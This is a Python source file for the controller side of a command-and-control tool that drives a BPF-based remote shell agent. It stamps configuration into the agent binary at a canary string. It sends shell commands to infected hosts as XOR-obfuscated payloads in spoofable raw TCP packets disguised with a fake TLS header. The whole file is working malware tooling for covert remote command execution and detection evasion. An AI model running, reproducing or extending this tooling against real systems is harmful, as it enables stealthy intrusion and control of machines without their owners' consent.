from c2.view import C2View
from pathlib import Path
from importlib.resources import files
from scapy.all import IP, TCP, send
import struct
import argparse
import logging


class C2:
    def __init__(self, args: argparse.Namespace, log_level: int = logging.INFO):
        self.args = args
        self.view = C2View(log_level=log_level, logfile=args.log_file)

    def _get_packed_config(self, args: argparse.Namespace) -> bytes:
        """Generates packed data for the BPF Remote Shell Executable Agent configuration.

        Args:
            args (argparse.Namespace): argparse arguments containing packed data options.

        Returns:
            bytes: Packed data to be stamped
        """
        packed_data = struct.pack("!I36x", args.seq)

        return packed_data

    def tcp_raw_send(self, args: argparse.Namespace) -> bool:
        """Sends a raw TCP packet to the configured agent.

        Args:
            args (argparse.Namespace): argparse arguments containing the TCP packet options.
        """

        try:
            command = args.command.encode(encoding="utf-8")
        except UnicodeEncodeError:
            self.view.print_error("Could not encode shell command.")
            return False

        cmd_len = struct.pack("!I", len(command))

        payload = command + cmd_len
        payload = bytes([b ^ 0x4F for b in payload])
        payload_len = struct.pack("!H", len(payload))

        tls_header = bytes.fromhex(
            "16030300800200007c0303dd875280dfd6e98188d937fbf419b0320d9a84af35b14219aa2ac9997"
            + "f02f9c420daab940bafefb1e25dc171e4f85b02a1f7b80b661bfdd7270021c89fe7988040130100"
            + "003400290002000000330024001d0020999098ac6cf3979e8ab1fa0ccebd6655f6513527f88f7c9"
            + "ae0ad16188e088a3f002b00020304140303000101170303"
        )
        tls_header += payload_len
        packet = (
            IP(dst=args.dip, src=args.sip)
            / TCP(dport=args.dport, sport=args.sport, flags="PA", seq=args.seq, ack=1)
            / tls_header
            / payload
        )

        if len(packet) > 5000:
            self.view.print_error("Packet size exceeds 5000 bytes. Aborting send.")
            return False
        self.view.print_msg(f"Sending: {packet.summary()}")
        try:
            send(packet, verbose=False)
            self.view.print_success("Packet sent successfully.")
        except PermissionError:
            self.view.print_error(f"Failed to send packet. Are you root?")
            return False
        return True

    def configure(self, args: argparse.Namespace) -> bool:
        """Configure the BPF Remote Shell Executable Agent.

        Args:
            args (argparse.Namespace): argparse arguments containing the configuration options.
        """
        self.view.print_msg(f"Configuring with args: {args}")
        path = files("c2.deploy").joinpath("agent_x86_64")

        path = Path(path).resolve()

        if not path.exists():
            self.view.print_error("Agent executable not found.")
            return False

        with open(path, "rb") as f:
            agent_data = f.read()

        canary = "According to all known laws of aviation"
        index = agent_data.find(canary.encode(encoding="utf-8"))

        if index == -1:
            self.view.print_error(f"Could not find agent canary.")
            return False

        packed_data = self._get_packed_config(args)
        new_data = agent_data[:index] + packed_data + agent_data[index + len(canary) :]

        output_dir = Path(args.output)
        output_dir.mkdir(parents=True, exist_ok=True)

        output_dir = Path(output_dir, f"{args.name}.agent")

        with open(output_dir, "wb") as f:
            f.write(new_data)
        self.view.print_success(f"Written new config to {output_dir.absolute()}")

        return True
